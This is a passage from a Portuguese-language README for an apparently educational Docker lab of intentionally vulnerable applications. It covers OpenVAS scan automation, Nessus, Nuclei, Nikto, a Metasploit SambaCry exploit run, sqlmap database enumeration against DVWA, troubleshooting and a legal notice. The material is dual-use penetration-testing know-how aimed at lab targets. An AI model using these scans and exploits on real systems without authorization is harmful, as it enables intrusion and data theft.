```bash
# Definir variáveis
OPENVAS_USER="admin"
OPENVAS_PASS="sua_senha"
TARGETS=$(cat targets.txt | tr '\n' ',' | sed 's/,$//')

# Criar target
gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<create_target>
    <name>VulnLab-$(date +%Y%m%d)</name>
    <hosts>$TARGETS</hosts>
    <port_list id='33d0cd82-57c6-11e1-8ed1-406186ea4fc5'/>
  </create_target>"

# Resposta esperada (salve o ID retornado)
# <create_target_response status="201" id="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"/>
```

#### Passo 4: Criar e Executar Task (Scan)

```bash
# IDs de referência do OpenVAS
# Full and Fast: daba56c8-73ec-11df-a475-002264764cea
# Full and Deep: 698f691e-7489-11df-9d8c-002264764cea

# Criar task (substitua TARGET_ID pelo ID obtido no passo anterior)
TARGET_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
CONFIG_ID="daba56c8-73ec-11df-a475-002264764cea"  # Full and Fast
SCANNER_ID="08b69003-5fc2-4037-a479-93b440211c73" # OpenVAS Default

gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<create_task>
    <name>Scan-VulnLab-$(date +%Y%m%d)</name>
    <target id='$TARGET_ID'/>
    <config id='$CONFIG_ID'/>
    <scanner id='$SCANNER_ID'/>
  </create_task>"

# Iniciar o scan (substitua TASK_ID)
TASK_ID="yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy"

gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<start_task task_id='$TASK_ID'/>"
```

#### Passo 5: Monitorar e Obter Resultados

```bash
# Verificar status do scan
gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<get_tasks task_id='$TASK_ID'/>"

# Listar relatórios
gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<get_reports/>"

# Exportar relatório em PDF (substitua REPORT_ID)
REPORT_ID="zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz"

gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<get_reports report_id='$REPORT_ID' format_id='c402cc3e-b531-11e1-9163-406186ea4fc5'/>" \
  | xmllint --xpath "//report_format" - | base64 -d > vulnlab-report.pdf
```

#### Exemplo Completo: Script de Automação

```bash
#!/bin/bash
# scan-vulnlab.sh - Automatiza scan do VulnLab com OpenVAS

OPENVAS_USER="admin"
OPENVAS_PASS="admin"
SOCKET="/var/run/gvmd/gvmd.sock"

# 1. Exportar alvos
cd ~/LabVulnerabilities
./lab.sh export-targets
TARGETS=$(cat targets.txt | tr '\n' ',' | sed 's/,$//')

echo "[*] Alvos: $TARGETS"

# 2. Criar target
echo "[*] Criando target no OpenVAS..."
TARGET_RESPONSE=$(gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<create_target><name>VulnLab-Auto</name><hosts>$TARGETS</hosts></create_target>")

TARGET_ID=$(echo $TARGET_RESPONSE | grep -oP 'id="\K[^"]+')
echo "[+] Target ID: $TARGET_ID"

# 3. Criar task
echo "[*] Criando task..."
TASK_RESPONSE=$(gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<create_task>
    <name>VulnLab-Scan</name>
    <target id='$TARGET_ID'/>
    <config id='daba56c8-73ec-11df-a475-002264764cea'/>
    <scanner id='08b69003-5fc2-4037-a479-93b440211c73'/>
  </create_task>")

TASK_ID=$(echo $TASK_RESPONSE | grep -oP 'id="\K[^"]+')
echo "[+] Task ID: $TASK_ID"

# 4. Iniciar scan
echo "[*] Iniciando scan..."
gvm-cli --gmp-username $OPENVAS_USER --gmp-password $OPENVAS_PASS socket \
  --xml "<start_task task_id='$TASK_ID'/>"

echo "[+] Scan iniciado! Acompanhe em https://localhost:9392"
```

#### Scans Recomendados por Categoria

| Categoria | Alvos | Scan Config | Tempo Estimado |
|-----------|-------|-------------|----------------|
| **Web Apps** | `172.30.7.0/24, 172.30.8.0/24, 172.30.9.0/24` | Full and Fast | 30-60 min |
| **Databases** | `172.30.14.0/24` | Full and Deep | 45-90 min |
| **CVEs Críticas** | `172.30.3.1, 172.30.4.1, 172.30.6.3, 172.30.6.4` | Full and Deep | 20-40 min |
| **Infra Completa** | `172.30.0.0/15` | Discovery + Full | 4-8 horas |

---

### Outros Scanners

#### Nessus

```bash
# Importar alvos
./lab.sh export-targets

# Via CLI (se disponível)
nessuscli scan --targets targets.txt --policy "Basic Network Scan"

# Via API
curl -k -X POST "https://localhost:8834/scans" \
  -H "X-ApiKeys: accessKey=xxx;secretKey=yyy" \
  -d '{"uuid":"template-uuid","settings":{"name":"VulnLab","text_targets":"'$(cat targets.txt)'"}}'
```

#### Nuclei

```bash
# Scan básico com templates de CVE
nuclei -l targets.txt -t cves/ -o nuclei-results.txt

# Scan completo
nuclei -l targets.txt -t cves/,vulnerabilities/,misconfiguration/ -severity critical,high

# Scan específico para web apps
echo "http://127.0.0.1:8005
http://127.0.0.1:3000
http://127.0.0.1:8003" > web-urls.txt

nuclei -l web-urls.txt -t http/cves/,http/vulnerabilities/ -o web-vulns.txt
```

#### Nikto

```bash
# Scan de aplicação web específica
nikto -h 127.0.0.1 -p 8005 -o dvwa-nikto.html -Format html

# Scan múltiplas portas
nikto -h 127.0.0.1 -p 8005,3000,8003,8001 -o web-nikto.txt

# Scan com tuning específico
nikto -h http://127.0.0.1:8005 -Tuning 9 -o sqli-xss-scan.txt
```

---

### Ferramentas de Pentest

#### Metasploit Framework

```bash
# Iniciar Metasploit com banco de dados
msfdb init
msfconsole -q

# Dentro do msfconsole:
# Configurar workspace
workspace -a vulnlab

# Scan de rede
db_nmap -sV -sC 172.30.0.0/16 -oA vulnlab-nmap

# Listar hosts descobertos
hosts

# Listar serviços
services

# Buscar vulnerabilidades conhecidas
vulns

# Exemplo: explorar SambaCry (CVE-2017-7494)
use exploit/linux/samba/is_known_pipename
set RHOSTS 172.30.4.1
set RPORT 445
exploit
```

#### SQLMap

```bash
# DVWA - SQL Injection (requer login primeiro)
# 1. Faça login no DVWA e obtenha o cookie PHPSESSID
# 2. Configure security level para "low"

sqlmap -u "http://127.0.0.1:8005/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123;security=low" \
  --dbs

# Enumerar tabelas
sqlmap -u "http://127.0.0.1:8005/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123;security=low" \
  -D dvwa --tables

# SQLi Labs
sqlmap -u "http://127.0.0.1:8110/Less-1/?id=1" --dbs --batch
```

#### Burp Suite

```text
1. Configure o proxy: 127.0.0.1:8080
2. Adicione ao escopo:
   - http://127.0.0.1:8005 (DVWA)
   - http://127.0.0.1:3000 (Juice Shop)
   - http://127.0.0.1:8003 (WebGoat)
3. Navegue pelas aplicações para capturar requests
4. Use o Intruder para fuzzing e Scanner para detecção automática
```

---

## Troubleshooting

### Erro: "YAML syntax error"

```bash
# Validar sintaxe
docker-compose config

# Se houver erro, verificar indentação
python3 -c "import yaml; yaml.safe_load(open('docker-compose.yml'))"
```

### Erro: "ContainerConfig KeyError"

```bash
# Remover containers corrompidos
docker rm -f $(docker ps -aq)

# Reiniciar
./lab.sh start dvwa juice-shop
```

### Erro: "Port already in use"

```bash
# Verificar processo usando a porta
sudo lsof -i :8005

# Ou com netstat
sudo netstat -tlnp | grep 8005

# Parar processo conflitante ou alterar porta no docker-compose.yml
```

### Erro: "No space left on device"

```bash
# Limpar imagens não utilizadas
docker system prune -a

# Limpar volumes
docker volume prune

# Verificar uso de disco
docker system df
```

### Performance: Containers lentos

```bash
# Verificar uso de recursos
./lab.sh stats

# Limitar recursos no docker-compose.yml
# deploy:
#   resources:
#     limits:
#       memory: 512M
```

---

## Contribuição

### Como Contribuir

1. Fork o repositório
2. Crie uma branch: `git checkout -b feature/nova-vulnerabilidade`
3. Commit suas mudanças: `git commit -m 'Add: novo container vulnerável'`
4. Push para a branch: `git push origin feature/nova-vulnerabilidade`
5. Abra um Pull Request

### Diretrizes

- Manter binding em `127.0.0.1` para todas as portas expostas
- Documentar CVEs e vulnerabilidades conhecidas
- Incluir credenciais padrão na documentação
- Testar com `docker-compose config` antes de commitar

---

## Aviso Legal

> **ATENÇÃO: USO EXCLUSIVAMENTE EDUCACIONAL**
>
> Este laboratório contém **aplicações severamente vulneráveis** que **NÃO DEVEM** ser expostas a redes públicas ou não confiáveis.
>
> **Uso permitido:**
> - Ambientes isolados de laboratório
> - Redes privadas para treinamento
> - Pesquisa de segurança autorizada
> - Desenvolvimento de ferramentas defensivas
>
> **Uso proibido:**
> - Exposição à internet
> - Testes em sistemas sem autorização
> - Atividades maliciosas
>
> Os mantenedores **NÃO SE RESPONSABILIZAM** por uso indevido deste material.

---

## Licença

Este projeto está licenciado sob a **MIT License** - veja o arquivo [LICENSE](LICENSE) para detalhes.

---

## Referências

- [OWASP Top 10](https://owasp.org/Top10/)
- [CVE Database](https://cve.mitre.org/)
- [Exploit Database](https://www.exploit-db.com/)
- [Docker Security](https://docs.docker.com/engine/security/)
- [NIST NVD](https://nvd.nist.gov/)

---

**Mantido por:** [Cristhian Kapelinski](https://github.com/CristhianKapelinski)

**Última atualização:** Janeiro 2026
